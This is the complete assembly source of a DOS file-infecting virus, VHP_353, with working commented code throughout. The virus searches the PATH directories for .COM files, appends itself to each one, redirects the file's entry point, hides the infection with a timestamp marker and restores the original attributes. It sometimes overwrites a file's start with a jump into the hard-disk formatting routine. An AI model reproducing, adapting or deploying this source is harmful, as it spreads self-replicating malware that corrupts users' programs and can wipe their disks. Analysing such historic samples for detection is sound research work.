	page	,132
	name	VHP_353
	title	Virus; based on the famous VHP-648 virus
	.radix	16

code	segment
	assume	cs:code,ds:code

	org	100

environ equ	2C

newjmp	equ	7Bh		;Code of jmp instruction
codeptr equ	7A		;Here is formed a jump to the virus code
pname	equ	78		;Offset of file name in the dir path
poffs	equ	76		;Offset in the contents of the `PATH' variable
errhnd	equ	74		;Save place for the old error handler
fname	equ	70		;Path name to search for
mydta	equ	2C		;DTA for Find First/Next:
attrib	equ	17		;File attribute
time	equ	16		;File time
date	equ	14		;File date
fsize	equ	12		;File size
namez	equ	0E		;File name found

start:
	jmp	short begin
	nop
	int	20

saveins db	3 dup (90)	;Original first 3 bytes

begin:
	call	virus		;Detrmine the virus start address

data	label	byte		;Data section

allcom	db	'*.COM',0       ;Filespec to search for
pathstr db	'PATH='

;This replaces the first instruction of a destroyed file.
;It's a JMP instruction into the hard disk formatting program (IBM XT only):

bad_jmp db	0EA,6,0,0,0C8

virus:
	pop	bx		;Make BX pointed at data
	mov	di,offset start ;Push the program true start address
	push	di		; onto the stack
	push	ax		;Save AX

	cld
	lea	si,[bx+saveins-data]	;Original instruction saved there
	movsw			;Move 2 + 1 bytes
	movsb
	mov	si,bx		;Keep SI pointed at data

	lea	bp,[bx+endcode-data+7A] ;Reserve local storage

	mov	ax,3524 	;Get interrupt 24h handler
	int	21		; and save it in errhnd

	mov	[bp-errhnd],bx
	mov	[bp-errhnd+2],es

	mov	ah,25		;Set interrupt 24h handler
	lea	dx,[si+handler-data]
	cmp	al,0		;DOS < 2.0 zeroes AL
	je	exit		;Exit if version < 2.0
	push	ds
	int	21

	lea	dx,[bp-mydta]
	mov	ax,1A00 	;Set DTA
	int	21

	xor	di,di		;Point ES:DI at the environment start
	mov	es,ds:[di+environ]	;Environment address
	mov	bx,si
search: 			;Search 'PATH' in the environment
	lea	si,[bx+pathstr-data]
	mov	cx,5		;5 letters in 'PATH='
	repe	cmpsb
	je	pfound		;PATH found, continue
	mov	ch,80		;Maximum 32 K in environment
	repne	scasb		;If not, skip through next 0
	scasb			;End of environment?
	dec	di
	jc	search		;If not, retry
pfound:
	pop	es		;Restore ES

	mov	[bp-poffs],di	;Save 'PATH' offset in poffs
	lea	di,[bp-fname]
	mov	[bp-pname],di

filesrch:
	lea	si,[bx+allcom-data]
	movsw
	movsw			;Move '*.COM' at fname
	movsw
	mov	si,bx		;Restore SI

	mov	ah,4E		;Find first file
	lea	dx,[bp-fname]
	mov	cl,11b		;Hidden, Read/Only or Normal files
	jmp	short findfile

checkfile:
	mov	al,[bp-time]	;Check file time
	and	al,11111b	; (the seconds, more exactly)
	cmp	al,62d/2	;Are they 62?

;If so, file is already contains the virus, search for another:

	je	findnext

;Is 10 <= file_size <= 64,000 bytes?

	sub	word ptr [bp-fsize],10d
	cmp	[bp-fsize],64000d-10d+1
	jc	process 	;If so, process the file

findnext:			;Otherwise find the next file
	mov	ah,4F		;Find next file
findfile:
	int	21
	jnc	checkfile	;If found, go chech some conditions

nextdir:
	mov	si,[bp-poffs]	;Get the offset in the PATH variable
	lea	di,[bp-fname]	;Point ES:DI at fname
	mov	ds,ds:[environ] ;Point DS:SI at the PATH variable found
	cmp	byte ptr [si],0 ;0 means end of PATH
	jnz	cpydir

olddta:
	mov	ax,2524 	;Set interrupt 24h handler
	lds	dx,dword ptr [bp-errhnd]
	int	21
	push	cs
	pop	ds		;Restore DS

exit:
	mov	ah,1A		;Set DTA
	mov	dx,80		;Restore DTA
	int	21

	pop	ax
	ret			;Go to CS:IP by doing funny RET

cpydir:
	lodsb			;Get a char from the PATH variable
	cmp	al,';'          ;`;' means end of directory
	je	enddir
	cmp	al,0		;0 means end of PATH variable
	je	enddir
	stosb			;Put the char in fname
	jmp	cpydir		;Loop until done
enddir:
	push	cs
	pop	ds		;Restore DS
	mov	[bp-poffs],si	;Save the new offset in the PATH variable
	mov	al,'\'          ;Add '\'
	stosb
	mov	[bp-pname],di
	jmp	filesrch	;And go find the first *.COM file

process:
	mov	di,dx		;[bp-pname]
	lea	si,[bp-namez]	;Point SI at namez
cpyname:
	lodsb			;Copy name found to fname
	stosb
	cmp	al,0
	jne	cpyname
	mov	si,bx		;Restore SI

	mov	ax,4301 	;Set file attributes
	call	clr_cx_dos

	mov	ax,3D02 	;Open file with Read/Write access
	int	21
	jc	oldattr 	;Exit on error
	mov	bx,ax		;Save file handle in BX

	mov	ah,2C		;Get system time
	int	21
	and	dh,111b 	;Are seconds a multiple of 8?
	jnz	infect		;If not, contaminate file (don't destroy):

;Destroy file by rewriting the first instruction:

	mov	cx,5		;Write 5 bytes
	lea	dx,[si+bad_jmp-data]	;Write THESE bytes
	jmp	short do_write	;Do it

;Try to contaminate file:

;Read first instruction of the file (first 3 bytes) and save it in saveins:

infect:
	mov	ah,3F		;Read from file handle
	mov	cx,3		;Read 3 bytes
	lea	dx,[si+saveins-data]	;Put them there
	call	dos_rw
	jc	oldtime 	;Exit on error

;Move file pointer to end of file:

	mov	ax,4202 	;LSEEK from end of file
	call	clr_dx_cx_dos

	mov	[bp-codeptr],ax ;Save result in codeptr

	mov	cx,endcode-saveins	;Virus code length as bytes to be written
	lea	dx,[si+saveins-data]	;Write from saveins to endcode
	call	dos_write	;Write to file handle
	jc	oldtime 	;Exit on error

	call	lseek		;LSEEK to the beginning of the file

;Rewrite the first instruction of the file with a jump to the virus code:

	mov	cl,3		;3 bytes to write
	lea	dx,[bp-newjmp]	;Write THESE bytes
do_write:
	call	dos_write	;Write to file handle

oldtime:
	mov	dx,[bp-date]	;Restore file date
	mov	cx,[bp-time]	; and time
	or	cl,11111b	;Set seconds to 62 (the virus' marker)

	mov	ax,5701 	;Set file date & time
	int	21
	mov	ah,3E		;Close file handle
	int	21

oldattr:
	mov	ax,4301 	;Set file attributes
	mov	cx,[bp-attrib]	;They were saved in attrib
	and	cx,3F
	lea	dx,[bp-fname]
	int	21		;Do it
	jmp	olddta		;And exit

lseek:
	mov	ax,4200 	;LSEEK from the beginning of the file
clr_dx_cx_dos:
	xor	dx,dx		;From the very beginning
clr_cx_dos:
	xor	cx,cx		;Auxiliary entry point
	db	3Dh		;Trick
dos_write:
	mov	ah,40		;Write to file handle
dos_rw:
	int	21
	jc	dos_ret 	;Exit on error
	cmp	ax,cx		;Set CF if AX < CX
dos_ret:
	ret

handler:			;Critical error handler
	mov	al,0		;Just ignore the error
	iret			; and return

	db	0E9		;The JMP opcode

endcode label	byte

code	ends
	end	start
